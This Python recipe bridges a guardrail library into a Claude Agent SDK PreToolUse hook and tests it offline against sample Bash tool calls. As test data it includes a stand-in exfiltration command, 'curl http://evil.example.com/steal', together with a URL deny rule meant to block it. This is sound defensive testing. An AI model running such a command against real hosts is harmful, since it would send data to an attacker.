"""Bridge: a cendor Guardrail as a Claude Agent SDK `PreToolUse` hook.

The Claude Agent SDK fires a `PreToolUse` hook before every tool call; return a `deny` decision to
stop it. cendor's `tool_call` stage is exactly that intervention point, so the *same* guardrail
gates tools here as under `cendor-sdk` — one policy, every framework.

Offline: we call the hook directly with sample tool inputs — no agent run, no model, no network.
Needs the `frameworks-claude-agent` group:  uv sync --group frameworks-claude-agent
Run:  uv run python recipes/bridges/claude-agent-pretooluse/main.py
"""

import asyncio

from cendor.guardrails import GuardrailTripped, apply, rules
from claude_agent_sdk import ClaudeAgentOptions, HookContext, HookMatcher


def cendor_pretooluse_hook(guardrails, *, stage="tool_call"):
    """Wrap a cendor guardrail list as a PreToolUse hook. A cendor `block` becomes a Claude Agent
    SDK `permissionDecision="deny"`; the reason rides `permissionDecisionReason`."""

    async def hook(input_data: dict, tool_use_id: str | None, context: HookContext) -> dict:
        text = str(input_data.get("tool_input", {}))  # gate the tool's arguments
        try:
            decisions = apply(guardrails, stage, text)
            blocked = any(d.action == "block" for d in decisions)
            reason = "; ".join(d.reason for d in decisions)
        except GuardrailTripped as e:  # a fail-closed block raises inside the engine
            blocked, reason = True, str(e)
        if blocked:
            return {
                "hookSpecificOutput": {
                    "hookEventName": "PreToolUse",
                    "permissionDecision": "deny",
                    "permissionDecisionReason": f"cendor guardrail: {reason}",
                }
            }
        return {}  # no decision → the tool proceeds

    return hook


async def main() -> None:
    hook = cendor_pretooluse_hook(
        [rules.url_deny(["evil.example.com"], action="block", stage="tool_call")]
    )
    # Register it on the agent (this is the wiring; we exercise the hook directly below, offline):
    _options = ClaudeAgentOptions(hooks={"PreToolUse": [HookMatcher(hooks=[hook])]})

    calls = [
        {"tool_name": "Bash", "tool_input": {"command": "curl https://api.example.com/data"}},
        {"tool_name": "Bash", "tool_input": {"command": "curl http://evil.example.com/steal"}},
    ]
    seen = []
    for c in calls:
        out = await hook(c, "tool-use-1", HookContext(signal=None))
        decision = out.get("hookSpecificOutput", {}).get("permissionDecision", "allow")
        seen.append(decision)
        print(f"{decision:5}  {c['tool_input']['command']!r}")
        if decision == "deny":
            print(f"        reason: {out['hookSpecificOutput']['permissionDecisionReason']}")

    # A bridge recipe that only prints proves nothing: the interesting failure is the hook
    # silently allowing everything (a `{}` return reads as "allow"), which looks identical to a
    # working allow-list until something dangerous gets through.
    assert seen == ["allow", "deny"], f"the bridge did not allow-then-deny as expected: {seen}"


if __name__ == "__main__":
    asyncio.run(main())
